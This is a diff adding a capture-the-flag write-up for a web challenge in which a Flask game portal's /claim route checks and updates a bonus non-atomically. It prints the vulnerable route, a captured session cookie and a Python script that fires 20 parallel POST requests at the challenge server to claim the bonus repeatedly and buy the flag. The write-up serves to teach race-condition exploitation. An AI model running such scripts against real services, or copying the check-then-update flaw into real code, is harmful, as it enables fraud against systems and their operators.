@@ -583,6 +583,132 @@ Flag: **umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr3ams}**
 
 ### Solution
 
+![1st page](img/portal.png)
+
+![2nd page](img/createaccount.png)
+
+![Last page](img/afterlogin.png)
+
+I Accessed the web portal at http://159.69.219.192:7859/:
+
+The landing page displayed a simple Game Portal with a button to Create Account.
+
+After exploring the portal, I figured out the basic workflow:
+
+  •	Create an account via `/register`.
+  
+  •	Login and view dashboard `/dashboard`.
+  
+  •	Collect daily bonus `/claim`.
+  
+  •	Redeem secret reward `/buy_flag` (needs **$3000** balance).
+
+![straightforward.zip](img/zipfile.png)
+
+The challenge provided the source code > unzip straightforward.zip > app.py.
+
+When I reviewed the `/claim` route, I found something interesting:
+
+```bash
+@app.route('/claim', methods=['POST'])
+def claim():
+    if 'username' not in session:
+        return redirect(url_for('register'))
+    username = session['username']
+    db = get_db()
+    cur = db.execute('SELECT claimed FROM redemptions WHERE username=?', (username,))
+    row = cur.fetchone()
+    if row and row['claimed']:
+        flash("You have already claimed your daily bonus!", "danger")
+        return redirect(url_for('dashboard'))
+    db.execute('INSERT OR REPLACE INTO redemptions (username, claimed) VALUES (?, 1)', (username,))
+    db.execute('UPDATE users SET balance = balance + 1000 WHERE username=?', (username,))
+    db.commit()
+    flash("Daily bonus collected!", "success")
+    return redirect(url_for('dashboard'))
+```
+
+What I noticed is:
+
+  1.	The database first checks if claimed, and only after that, it updates.
+     
+  2.	No database locking or atomicity between checking and updating.
+     
+  3.	Race Condition is possible.
+
+I knew about Race Condition from general web CTF knowledge and from [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions). When updates are not atomic, and multiple requests are fired fast enough, the database might allow duplicate operations.
+
+If multiple requests are sent simultaneously, database race may allow multiple bonuses before `claimed` is fully set. 
+
+So, we need to make a script for this challenge! But first, we need to gain the session cookies because the server uses Flask sessions to track who the current logged-in user is.
+
+![Session](img/session.png)
+
+If there is no valid session, the server rejects access to protected pages.
+
+**Info!**
+I collected my session cookie before clicking `Collect Daily Bonus` because if I clicked it first, the server would mark my account as already claimed. By grabbing the cookie early, I could send many bonus requests manually and abuse the race condition before the claim was locked.
+
+![Session Cookies](img/sessioncookies.png)
+
+Session Cookie:
+
+`.eJyrViotTi3KS8xNVbJSyqtMzC3NRgFKtQDiHw0f.Z_n4vw.wyp2BKfyvhs03ntNPfjjMQLohWk`
+
+Next, I asked my best duo gpt to create me a Python script to send 20+ parallel `POST` requests to `/claim`.
+
+Exploit.py:
+
+```bash
+import threading
+import requests
+
+# Settings
+url = "http://159.69.219.192:7859/claim"
+session_cookie = ".eJyrViotTi3KS8xNVbJSyqtMzC3NRgFKtQDiHw0f.Z_n4vw.wyp2BKfyvhs03ntNPfjjMQLohWk"
+threads_count = 20  # You can increase this for heavier attack
+
+# Function to send POST request
+def claim_bonus():
+    cookies = {'session': session_cookie}
+    try:
+        response = requests.post(url, cookies=cookies, timeout=3)
+        print(f"[+] Status: {response.status_code} | Length: {len(response.text)}")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+# Create threads
+threads = []
+for i in range(threads_count):
+    t = threading.Thread(target=claim_bonus)
+    t.start()
+    threads.append(t)
+
+# Wait for all threads to complete
+for t in threads:
+    t.join()
+
+print("[*] Finished sending all claim requests.")
+```
+
+![Output Exploit](img/exploitoutput.png)
+
+Then I click refresh on the browser, BOOM! the current balance increase.
+
+![Refresh Browser](img/refresh.png)
+
+Then, click the `Redeem Secret Reward` for **$3000** and get the flag.
+
+![Flag](img/flag7.png)
+
+Yeayy! we got the flag:
+
+Flag: **UMCS{th3_s0lut10n_1s_pr3tty_str41ghtf0rw4rd_too!}**
+
+
+
+
+
 
 
 
